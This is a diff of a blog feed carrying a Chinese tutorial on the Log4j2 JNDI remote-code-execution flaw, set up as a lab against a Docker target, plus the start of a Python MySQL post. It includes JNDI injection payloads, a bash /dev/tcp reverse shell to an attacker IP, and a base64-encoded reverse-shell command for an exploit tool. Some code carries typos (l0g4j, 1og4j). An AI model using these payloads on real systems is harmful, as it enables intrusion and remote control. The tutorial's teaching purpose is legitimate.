@@ -9,12 +9,7 @@
 <h1 id="二、漏洞原理"><a href="#二、漏洞原理" class="headerlink" title="二、漏洞原理"></a>二、漏洞原理</h1><h2 id="1、原理概述"><a href="#1、原理概述" class="headerlink" title="1、原理概述"></a>1、原理概述</h2><p>Apache log4j2-RCE漏洞是由于Log4j2提供的lookup功能下的jndi Lookup模块出现问题所导致的，该功能模块在输出日志信息时允许开发人员通过相应的协议去<strong>请求远程主机上的资源</strong>。而开发人员在处理数据时，并没有对用户输入的信息进行判断，导致Log4j2请求远程主机上的含有恶意代码的资源并执行其中的代码，从而造成远程代码执行漏洞。</p>
 <h2 id="2、JNDI"><a href="#2、JNDI" class="headerlink" title="2、JNDI"></a>2、JNDI</h2><p>开发人员一般会使用log4j2在日志中输出一些变量，Iog4j2除了可以输出程序中的变量，它还提供了多种lookup功能插件，可以用来查找更多数据用于输出。lookupi在log4j2中，就是允许在输出日志的时候，通过多种方式去查找要输出的内容，其中就可以使用ndi Lookup。</p>
 <p>JNDI (Java Naming and Directory Interface，JAVA命名和目录接口)：它提供一个目录系统，并将服务名称与对象关联起来，从而使得开发人员在开发过程中可以使用名称来访问对象。JND下面有很多目录接口，用于不同的数据源的查找引用。</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog.pppfz.com/assets/0c5aff5fc511dbb9d5697c91e9add598.png"
-                      alt="0c5aff5fc511dbb9d5697c91e9add598.png"
-                ></p>
+<p><img src="https://blog.pppfz.com/assets/0c5aff5fc511dbb9d5697c91e9add598.png" alt="0c5aff5fc511dbb9d5697c91e9add598.png"></p>
 <p>JNDI可以使用相应目录接口请求普通数据，还可以请求Java（编译型语言）对象。而且JNDl支持以命名引用(Naming References)的方式去远程下载一个class（Java编译后的文件 .class）文件，然后加载该class文件并构建对象。若下载的是攻击者构建的含有恶意代码的class文件，则会在加载时执行恶意代码。</p>
 <p>在这些目录接口中我们可以使用LDAP或RMI去下载远程主机上的class文件。</p>
 <p>LDAP(轻型目录访问协议)：是一个开放的，中立的，工业标准的应用协议，通过P协议提供访问控制和维护分布式信息的目录信息。目录是一个为查询、浏览和搜索而优化的专业分布式数据库，它呈树状结构组织数据，就好象Linux&#x2F;Unix系统中的文件目录一样。</p>
@@ -32,18 +27,18 @@
 <li>Apache log4j2   2.14.1</li>
 </ul>
 <h2 id="2、实验过程"><a href="#2、实验过程" class="headerlink" title="2、实验过程"></a>2、实验过程</h2><p>创建一个Maven项目，在pom.xm文件中引入Iog4j依赖，指定版本为2.14.1。</p>
-<div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.logging.1og4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>l0g4j-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.14.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.logging.1og4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.14.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
+<figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.logging.1og4j<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>l0g4j-api<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.14.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.logging.1og4j<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>log4j-core<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.14.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure>
 
 <p>模拟黑客服务器：</p>
 <p>1.创建EvilObj类，执行Windows命令打开计算器。</p>
-<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Evilobj</span> &#123;</span><br><span class="line">	<span class="keyword">static</span> &#123;</span><br><span class="line">		System.out.println(<span class="string">&quot;执行恶意代码！&quot;</span>)；</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			<span class="comment">//执行命令打开计算器</span></span><br><span class="line">			Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>)</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Evilobj</span> &#123;<br>	<span class="hljs-keyword">static</span> &#123;<br>		System.out.println(<span class="hljs-string">&quot;执行恶意代码！&quot;</span>)；<br>		<span class="hljs-keyword">try</span> &#123;<br>			<span class="hljs-comment">//执行命令打开计算器</span><br>			Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>)<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e)&#123;<br>			e.printStackTrace();<br>		&#125;<br>	&#125;<br>&#125;<br></code></pre></td></tr></table></figure>
 
 <p>2.创建RMIServer类，用于开启RMI服务。</p>
-<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> rmi;</span><br><span class="line"><span class="keyword">import</span> ...;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//启动rmi服务，端口为1099</span></span><br><span class="line">            LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">            <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry();</span><br><span class="line">            <span class="comment">//创建资源，指定资源为本机rmi目录下的EvilObj类</span></span><br><span class="line">            <span class="type">Reference</span> <span class="variable">reference</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;rmi.Evilobj&quot;</span>,<span class="string">&quot;rmi.Evilobj&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">            <span class="type">Referencewrapper</span> <span class="variable">referencewrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Referencewrapper</span> (reference);</span><br><span class="line">            <span class="comment">//绑定资源，用于客户机访问对应资源</span></span><br><span class="line">            registry.bind(<span class="string">&quot;evil&quot;</span>,referenceWrapper);</span><br><span class="line">            System.out.println(<span class="string">&quot;RMI服务初始化完成&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printstackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> rmi;<br><span class="hljs-keyword">import</span> ...;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMIServer</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//启动rmi服务，端口为1099</span><br>            LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br>            <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.getRegistry();<br>            <span class="hljs-comment">//创建资源，指定资源为本机rmi目录下的EvilObj类</span><br>            <span class="hljs-type">Reference</span> <span class="hljs-variable">reference</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Reference</span>(<span class="hljs-string">&quot;rmi.Evilobj&quot;</span>,<span class="hljs-string">&quot;rmi.Evilobj&quot;</span>,<span class="hljs-literal">null</span>);<br>            <span class="hljs-type">Referencewrapper</span> <span class="hljs-variable">referencewrapper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Referencewrapper</span> (reference);<br>            <span class="hljs-comment">//绑定资源，用于客户机访问对应资源</span><br>            registry.bind(<span class="hljs-string">&quot;evil&quot;</span>,referenceWrapper);<br>            System.out.println(<span class="hljs-string">&quot;RMI服务初始化完成&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printstackTrace();<br>        &#125;<br>	&#125;<br>&#125;<br></code></pre></td></tr></table></figure>
 
 <p>模拟受害主机：</p>
 <p>1.创建HackedServer类，模拟攻击者发送信息，受害服务器将对应信息作为error级别日志输出。</p>
-<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.woniu;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.Logging.Log4j.LogManager;</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.Logger;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hackedserver</span> &#123;</span><br><span class="line">    <span class="comment">//创建日志记录器</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Logger</span> <span class="variable">logger</span> <span class="operator">=</span> LogManager.getLogger(); <span class="comment">//实例化对象</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(string...args)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;被攻击服务器&quot;</span>);</span><br><span class="line">        <span class="comment">//模拟攻击者发送请求中的username字段，指向攻击者服务器上的恶意class</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span><span class="string">&quot;$jndi:rmi://192.168.200.95/evil&#125;;</span></span><br><span class="line"><span class="string">        //输出错误日志信息</span></span><br><span class="line"><span class="string">        logger.error(&quot;</span>errorinfo：&#123;&#125;!<span class="string">&quot;username);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure></div>
+<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.woniu;<br><br><span class="hljs-keyword">import</span> org.apache.Logging.Log4j.LogManager;<br><span class="hljs-keyword">import</span> org.apache.logging.log4j.Logger;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Hackedserver</span> &#123;<br>    <span class="hljs-comment">//创建日志记录器</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Logger</span> <span class="hljs-variable">logger</span> <span class="hljs-operator">=</span> LogManager.getLogger(); <span class="hljs-comment">//实例化对象</span><br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(string...args)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;被攻击服务器&quot;</span>);<br>        <span class="hljs-comment">//模拟攻击者发送请求中的username字段，指向攻击者服务器上的恶意class</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">username</span> <span class="hljs-operator">=</span><span class="hljs-string">&quot;$jndi:rmi://192.168.200.95/evil&#125;;</span><br><span class="hljs-string">        //输出错误日志信息</span><br><span class="hljs-string">        logger.error(&quot;</span>errorinfo：&#123;&#125;!<span class="hljs-string">&quot;username);</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string">&#125;</span><br></code></pre></td></tr></table></figure>
 
 <p>攻击过程模拟：</p>
 <p>1.运行RMIServer，启动RMI服务。</p>
@@ -54,45 +49,35 @@
 <p><strong>攻击者</strong></p>
 <p>主机：kali</p>
 <p>JNDI注入工具：JNDl-Injection-Exploit-1.0-SNAPSHOT-all.jar</p>
-<p><a class="link"   href="https://github.com/welk1n/JNDl-Injection-Exploit/releases/tag/v1.0" >https://github.com/welk1n/JNDl-Injection-Exploit/releases/tag/v1.0 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><a href="https://github.com/welk1n/JNDl-Injection-Exploit/releases/tag/v1.0">https://github.com/welk1n/JNDl-Injection-Exploit/releases/tag/v1.0</a></p>
 <h2 id="2、实验过程-1"><a href="#2、实验过程-1" class="headerlink" title="2、实验过程"></a>2、实验过程</h2><h3 id="1-安装docker"><a href="#1-安装docker" class="headerlink" title="1.安装docker"></a>1.安装docker</h3><p>(1)安装docker所需工具：<code>yum install-y yum-utils device-mapper-persistent-data lvm2</code></p>
-<p>(2)添加yum镜像：<code>yum-config-manager --add-repo</code> <a class="link"   href="http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo" >http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p>(2)添加yum镜像：<code>yum-config-manager --add-repo</code> <a href="http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo">http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo</a></p>
 <p>(3)更新yum缓存：<code>yum makecache fast</code></p>
 <p>(4)下载安装docker：<code>yum install docker-ce</code></p>
 <p>(5)启动docker：<code>systemctl start docker</code></p>
 <p>(6)配置Docker的国内镜像：<code>vi /etc/docker/daemon.json</code></p>
-<h3 id="2-使用dockeri部署log4j2漏洞靶场"><a href="#2-使用dockeri部署log4j2漏洞靶场" class="headerlink" title="2.使用dockeri部署log4j2漏洞靶场"></a>2.使用dockeri部署log4j2漏洞靶场</h3><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">systemctl restart docker</span><br><span class="line">docker ps</span><br><span class="line">docker ps -a</span><br><span class="line"></span><br><span class="line">-------------</span><br><span class="line"></span><br><span class="line">PS C:\Users\ppp&gt; docker ps -a</span><br><span class="line">=============================</span><br><span class="line">CONTAINER ID   IMAGE         COMMAND    CREATED          STATUS                      PORTS     NAMES</span><br><span class="line">b39cdddd1dd3   hello-world   &quot;/hello&quot;   13 seconds ago   Exited (0) 12 seconds ago             charming_chandrasekhar</span><br></pre></td></tr></table></figure></div>
+<h3 id="2-使用dockeri部署log4j2漏洞靶场"><a href="#2-使用dockeri部署log4j2漏洞靶场" class="headerlink" title="2.使用dockeri部署log4j2漏洞靶场"></a>2.使用dockeri部署log4j2漏洞靶场</h3><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">systemctl restart docker<br>docker ps<br>docker ps -a<br><br>-------------<br><br>PS C:\Users\ppp&gt; docker ps -a<br>=============================<br>CONTAINER ID   IMAGE         COMMAND    CREATED          STATUS                      PORTS     NAMES<br>b39cdddd1dd3   hello-world   &quot;/hello&quot;   13 seconds ago   Exited (0) 12 seconds ago             charming_chandrasekhar<br></code></pre></td></tr></table></figure>
 
-<h4 id="（1）拉取log4j2漏洞的靶场镜像"><a href="#（1）拉取log4j2漏洞的靶场镜像" class="headerlink" title="（1）拉取log4j2漏洞的靶场镜像"></a>（1）拉取log4j2漏洞的靶场镜像</h4><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">拉取镜像</span></span><br><span class="line">docker pull vulfocus/log4j2-rce-2021-12-09</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">导入本地镜像</span></span><br><span class="line">docker load -i log4j2-rce-2021-12-09.tar.gz  </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">导入拉取成功</span></span><br><span class="line">PS C:\Users\ppp&gt; docker images</span><br><span class="line">------------------------------</span><br><span class="line">REPOSITORY                       TAG       IMAGE ID       CREATED         SIZE</span><br><span class="line">vulfocus/log4j2-rce-2021-12-09   latest    4ba6de62bfd4   19 months ago   569MB</span><br></pre></td></tr></table></figure></div>
+<h4 id="（1）拉取log4j2漏洞的靶场镜像"><a href="#（1）拉取log4j2漏洞的靶场镜像" class="headerlink" title="（1）拉取log4j2漏洞的靶场镜像"></a>（1）拉取log4j2漏洞的靶场镜像</h4><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">拉取镜像</span><br>docker pull vulfocus/log4j2-rce-2021-12-09<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">导入本地镜像</span><br>docker load -i log4j2-rce-2021-12-09.tar.gz  <br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">导入拉取成功</span><br>PS C:\Users\ppp&gt; docker images<br>------------------------------<br>REPOSITORY                       TAG       IMAGE ID       CREATED         SIZE<br>vulfocus/log4j2-rce-2021-12-09   latest    4ba6de62bfd4   19 months ago   569MB<br></code></pre></td></tr></table></figure>
 
 <blockquote>
-<p><a class="link"   href="https://vulhub.org/" >Vulhub - Docker-Compose file for vulnerability environment <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><a href="https://vulhub.org/">Vulhub - Docker-Compose file for vulnerability environment</a></p>
 </blockquote>
 <h4 id="（2）创建容器并运行"><a href="#（2）创建容器并运行" class="headerlink" title="（2）创建容器并运行"></a>（2）创建容器并运行</h4><p><code>docker run -tid -p 8080:8080 vulfocus/log4j2-rce-2021-12-09</code></p>
-<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">运行镜像</span></span><br><span class="line">docker run -itd --name log4j2 -p 8080:8080 4ba6de62bfd4（IMAGE ID）</span><br><span class="line"></span><br><span class="line">================</span><br><span class="line">PS C:\Users\ppp&gt; docker run -itd --name log4j2 -p 8080:8080 4ba6de62bfd4</span><br><span class="line">----------------</span><br><span class="line">07155d44bbb88c17c04facd09faed6fcb7ae2d1094db4f51390d7e0c29d66c08</span><br><span class="line"></span><br><span class="line">================</span><br><span class="line">PS C:\Users\ppp&gt; docker ps  # cheng</span><br><span class="line">CONTAINER ID   IMAGE          COMMAND                   CREATED          STATUS          PORTS                    NAMES</span><br><span class="line">07155d44bbb8   4ba6de62bfd4   &quot;java -jar /demo/dem…&quot;   56 seconds ago   Up 55 seconds   0.0.0.0:8080-&gt;8080/tcp   log4j2</span><br></pre></td></tr></table></figure></div>
+<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">运行镜像</span><br>docker run -itd --name log4j2 -p 8080:8080 4ba6de62bfd4（IMAGE ID）<br><br>================<br>PS C:\Users\ppp&gt; docker run -itd --name log4j2 -p 8080:8080 4ba6de62bfd4<br>----------------<br>07155d44bbb88c17c04facd09faed6fcb7ae2d1094db4f51390d7e0c29d66c08<br><br>================<br>PS C:\Users\ppp&gt; docker ps  # cheng<br>CONTAINER ID   IMAGE          COMMAND                   CREATED          STATUS          PORTS                    NAMES<br>07155d44bbb8   4ba6de62bfd4   &quot;java -jar /demo/dem…&quot;   56 seconds ago   Up 55 seconds   0.0.0.0:8080-&gt;8080/tcp   log4j2<br></code></pre></td></tr></table></figure>
 
-<h4 id="（3）开启8080端口，访问web服务"><a href="#（3）开启8080端口，访问web服务" class="headerlink" title="（3）开启8080端口，访问web服务"></a>（3）开启8080端口，访问web服务</h4><p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog.pppfz.com/assets/117350f11a80fb9df3992f43bb78971f.png"
-                      alt="117350f11a80fb9df3992f43bb78971f.png"
-                ></p>
-<h3 id="3-使用DNSLog进行测试"><a href="#3-使用DNSLog进行测试" class="headerlink" title="3.使用DNSLog进行测试"></a>3.使用DNSLog进行测试</h3><p>(1)前往 <a class="link"   href="http://www.dnslog.cn/" >http://www.dnslog.cn <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> ,申请子域名进行测试</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog.pppfz.com/assets/a096ba03a94522ae0444a2d38d5d5051.png"
-                      alt="a096ba03a94522ae0444a2d38d5d5051.png"
-                ></p>
-<p>(2)在web主页面中点击 ???，url地址变为 <a class="link"   href="http://localhost:8080/hello?payloada=111" >http://localhost:8080/hello?payloada=111 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> ,更改payload为${jndi:ldap:&#x2F;test.f2l309.dnslog.cn}，并将payloadi进行url编码。</p>
-<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8080/hello?payload=$&#123;jndi:ldap://test.cohgfw.dnslog.cn&#125;</span><br><span class="line"></span><br><span class="line">http://127.0.0.1:8080/hello?payload=%24%7b%6a%6e%64%69%3a%6c%64%61%70%3a%2f%2f%74%65%73%74%2e%63%6f%68%67%66%77%2e%64%6e%73%6c%6f%67%2e%63%6e%7d</span><br></pre></td></tr></table></figure></div>
+<h4 id="（3）开启8080端口，访问web服务"><a href="#（3）开启8080端口，访问web服务" class="headerlink" title="（3）开启8080端口，访问web服务"></a>（3）开启8080端口，访问web服务</h4><p><img src="https://blog.pppfz.com/assets/117350f11a80fb9df3992f43bb78971f.png" alt="117350f11a80fb9df3992f43bb78971f.png"></p>
+<h3 id="3-使用DNSLog进行测试"><a href="#3-使用DNSLog进行测试" class="headerlink" title="3.使用DNSLog进行测试"></a>3.使用DNSLog进行测试</h3><p>(1)前往 <a href="http://www.dnslog.cn/">http://www.dnslog.cn</a> ,申请子域名进行测试</p>
+<p><img src="https://blog.pppfz.com/assets/a096ba03a94522ae0444a2d38d5d5051.png" alt="a096ba03a94522ae0444a2d38d5d5051.png"></p>
+<p>(2)在web主页面中点击 ???，url地址变为 <a href="http://localhost:8080/hello?payloada=111">http://localhost:8080/hello?payloada=111</a> ,更改payload为${jndi:ldap:&#x2F;test.f2l309.dnslog.cn}，并将payloadi进行url编码。</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">http://127.0.0.1:8080/hello?payload=$&#123;jndi:ldap://test.cohgfw.dnslog.cn&#125;<br><br>http://127.0.0.1:8080/hello?payload=%24%7b%6a%6e%64%69%3a%6c%64%61%70%3a%2f%2f%74%65%73%74%2e%63%6f%68%67%66%77%2e%64%6e%73%6c%6f%67%2e%63%6e%7d<br></code></pre></td></tr></table></figure>
 
 <p>访问成功后，查看DNSLog的DNS查询记录，出现payload中的字段说明测试成功。</p>
 <h3 id="4-利用JNDI注入反弹shell"><a href="#4-利用JNDI注入反弹shell" class="headerlink" title="4.利用JNDI注入反弹shell"></a>4.利用JNDI注入反弹shell</h3><p>(1)准备反弹shell，并将此命令进行base64编码</p>
-<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/攻击主机IP/端口 0&gt;&amp;1</span><br><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.1.5/4444 0&gt;&amp;1</span><br></pre></td></tr></table></figure></div>
+<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">bash -i &gt;&amp; /dev/tcp/攻击主机IP/端口 0&gt;&amp;1<br>bash -i &gt;&amp; /dev/tcp/192.168.1.5/4444 0&gt;&amp;1<br></code></pre></td></tr></table></figure>
 
 <p>(2)使用JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar进行漏洞利用，将上述base64编码结果填入指定位置，指定kali的IP启动服务。</p>
-<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -c &quot;bash -c &#123;echo,base64码后的she11&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; -A 攻击主机IP</span><br><span class="line"></span><br><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -c &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuNS80NDQ0IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; -A 攻击主机IP(kali)</span><br></pre></td></tr></table></figure></div>
+<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -c &quot;bash -c &#123;echo,base64码后的she11&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; -A 攻击主机IP<br><br>java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -c &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuNS80NDQ0IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; -A 攻击主机IP(kali)<br></code></pre></td></tr></table></figure>
 
 ]]></content>
       <categories>
@@ -105,13 +90,13 @@
   <entry>
     <title>Python 操作MySQL数据库</title>
     <url>/2023/09/25/Python-%E6%93%8D%E4%BD%9CMySQL%E6%95%B0%E6%8D%AE%E5%BA%93/</url>
-    <content><![CDATA[<h3 id="1、输出为元组的形式"><a href="#1、输出为元组的形式" class="headerlink" title="1、输出为元组的形式"></a>1、输出为元组的形式</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 针对数据库的操作，一共分三步：  </span></span><br><span class="line"><span class="comment"># 1、建立数据库连接  </span></span><br><span class="line"><span class="comment"># 2、执行SQL语句  </span></span><br><span class="line"><span class="comment"># 3、关闭数据库连  </span></span><br><span class="line">  </span><br><span class="line"><span class="comment"># Python操作数据库（如：MySQL),Python发送能够与数据库直接通信的数据包，并获取数据库服务器的啊应结果。  </span></span><br><span class="line"><span class="comment"># 是一种典型的基于TCP/IP的通信过程，要求必须要满足数据库服务器的数据包规则  </span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> pymysql  </span><br><span class="line"><span class="comment"># 建立连接  </span></span><br><span class="line">conn = pymysql.connect(host= <span class="string">&#x27;192.168.112.188&#x27;</span>,user=<span class="string">&#x27;qiang&#x27;</span>,password=<span class="string">&#x27;123456&#x27;</span>,database=<span class="string">&#x27;learn&#x27;</span>,charset=<span class="string">&#x27;utf8&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line"><span class="comment"># 操作数据库，先定义一个游标对象（默认输出的是元组的形式）  </span></span><br><span class="line">cursor = conn.cursor()  </span><br><span class="line"><span class="comment"># 执行SQL语句  </span></span><br><span class="line">sql = <span class="string">&#x27;selcet username,password,role from user where userid&lt;6&#x27;</span>  </span><br><span class="line">cursor.execute(sql)   <span class="comment"># 注意是用游标来操作，不是用conn来操作  </span></span><br><span class="line"><span class="comment">#获取结果集  </span></span><br><span class="line">result = cursor.fetchall()   <span class="comment">#返回的元组  </span></span><br><span class="line"><span class="built_in">print</span>(result)  </span><br><span class="line">  </span><br><span class="line"><span class="comment"># 关闭连接  </span></span><br><span class="line">conn.close()</span><br></pre></td></tr></table></figure></div>
